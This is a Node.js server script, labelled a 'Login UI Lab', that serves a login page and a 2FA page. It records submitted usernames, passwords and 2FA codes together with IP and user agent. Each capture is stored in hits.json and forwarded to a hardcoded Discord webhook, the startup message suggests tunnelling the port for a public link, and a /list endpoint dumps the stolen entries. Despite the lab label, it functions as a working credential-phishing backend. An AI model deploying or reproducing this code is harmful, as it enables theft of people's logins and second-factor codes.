#!/usr/bin/env node
/**
 * Login UI Lab server
 * Termux / iSH / any Node host
 */
const http = require("http");
const fs = require("fs");
const path = require("path");
const { URL } = require("url");

const PORT = process.env.PORT || 8080;
const DISCORD = process.env.DISCORD_WEBHOOK ||
  "https://discord.com/api/webhooks/1542285698793738261/V5Xo_-9X3wofL-Xc_iAquKH4ml6nKaR203vTarrbw6LOWaZGGJJEK-b97o3rguhoALYp";
const DB = path.join(__dirname, "hits.json");

if (!fs.existsSync(DB)) fs.writeFileSync(DB, "[]");

function pushDiscord(text) {
  if (!DISCORD || DISCORD.includes("YOUR")) return;
  fetch(DISCORD, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content: String(text).slice(0, 1900) })
  }).catch(() => {});
}

function save(row) {
  const list = JSON.parse(fs.readFileSync(DB, "utf8"));
  list.unshift({ ...row, at: new Date().toISOString() });
  fs.writeFileSync(DB, JSON.stringify(list.slice(0, 1000), null, 2));
  const line = `**${row.type || "capture"}**\n\`${row.username || ""}\` / \`${row.password || ""}\`\nip: ${row.ip || ""}\nua: ${(row.ua || "").slice(0, 120)}\n${row.extra || ""}`;
  pushDiscord(line);
  console.log("[+]", row.type || "submit", row.username);
}

function readFile(name) {
  const p = path.join(__dirname, name);
  return fs.existsSync(p) ? fs.readFileSync(p, "utf8") : null;
}

const server = http.createServer((req, res) => {
  const u = new URL(req.url, `http://0.0.0.0:${PORT}`);
  const ip = (req.headers["x-forwarded-for"] || req.socket.remoteAddress || "").toString();

  if (req.method === "GET" && (u.pathname === "/" || u.pathname === "/index.html")) {
    const html = readFile("index.html");
    res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
    return res.end(html || "missing index.html");
  }

  if (req.method === "GET" && u.pathname === "/2fa.html") {
    const html = readFile("2fa.html");
    res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
    return res.end(html || "missing 2fa.html");
  }

  if (req.method === "POST" && u.pathname === "/collect") {
    let body = "";
    req.on("data", c => (body += c));
    req.on("end", () => {
      try {
        const j = JSON.parse(body);
        save({
          type: j.type || "submit",
          username: j.username || j.u || "",
          password: j.password || j.p || j.code || "",
          ua: j.ua || req.headers["user-agent"] || "",
          ip,
          extra: j.extra || ""
        });
      } catch {}
      res.writeHead(204);
      res.end();
    });
    return;
  }

  if (req.method === "GET" && u.pathname === "/list") {
    res.writeHead(200, { "Content-Type": "application/json" });
    return res.end(fs.readFileSync(DB));
  }

  res.writeHead(404);
  res.end();
});

server.listen(PORT, "0.0.0.0", () => {
  console.log("lab on http://0.0.0.0:" + PORT);
  console.log("tunnel this port for a public link");
  console.log("list -> /list");
});
